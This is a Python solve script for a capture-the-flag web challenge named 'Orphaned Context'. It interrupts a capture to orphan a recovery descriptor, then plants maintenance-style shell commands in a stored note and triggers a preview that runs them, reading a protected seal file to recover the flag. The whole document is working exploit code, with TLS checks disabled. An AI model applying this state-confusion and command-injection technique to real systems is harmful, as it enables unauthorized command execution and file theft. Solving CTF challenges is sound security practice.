#!/usr/bin/env python3
"""Orphaned Context — cat the protected seal at /incidents/IR-7731/seal via the
trusted orphaned-descriptor preview. Recover the flag."""
import json, re
import requests, urllib3
urllib3.disable_warnings()
B="https://orphaned-context-c18229f45f48.chall.hiddeninvestigations.net"
s=requests.Session(); s.verify=False
s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Accept":"application/json"})
def post(p, body): r=s.post(B+p, json=body, timeout=15); return r.status_code, r.json()
def get(p): return requests.get(B+p, timeout=15, verify=False, headers={"Accept":"application/json"}).json()
FLAG=re.compile(r'[A-Za-z0-9_]{2,25}\{[^}]{3,200}\}')

def free_slots():
    ev=get("/api/relay/events")["events"]
    caps={}; notes={}
    for e in ev:
        if e["type"]=="CAPTURE_OPEN": caps[e["request_id"]]="open"
        elif e["type"] in ("CAPTURE_COMMIT","CAPTURE_INTERRUPT"): caps[e["request_id"]]=e["type"]
        elif e["type"]=="NOTE_STORE": notes[e["note_id"]]=("stored",e["epoch"])
        elif e["type"]=="NOTE_DISCARD": notes[e["note_id"]]=("discarded",None)
    for rid,st in caps.items():
        if st=="open": post("/api/capture/interrupt", {"request_id":rid})
    for nid,(st,ep) in notes.items():
        if st=="stored": post("/api/note/discard", {"note_id":nid,"epoch":ep})

def run_maint(lines):
    free_slots()
    _,o=post("/api/capture/open", {"incident":"IR-7731"})
    rid=o["recovery_descriptor"]; req=o["request_id"]
    post("/api/capture/interrupt", {"request_id":req})
    post("/api/note/store", {"text":"#!relay-maint/1\n"+"\n".join(lines)+"\n"})
    return post("/api/recover/preview", {"recovery_descriptor":rid})

c,r=run_maint([
    "ls /incidents/IR-7731",
    "cat /incidents/IR-7731/seal",
    "cat /incidents/IR-7731/manifest",
])
for d in r.get("diagnostics",[]):
    print(f"$ {d['cmd']}  (ok={d.get('ok')})")
    print(str(d.get("output","")).replace("\n","\n  "))
    print()
for m in FLAG.finditer(json.dumps(r)):
    print("*** FLAG:", m.group())
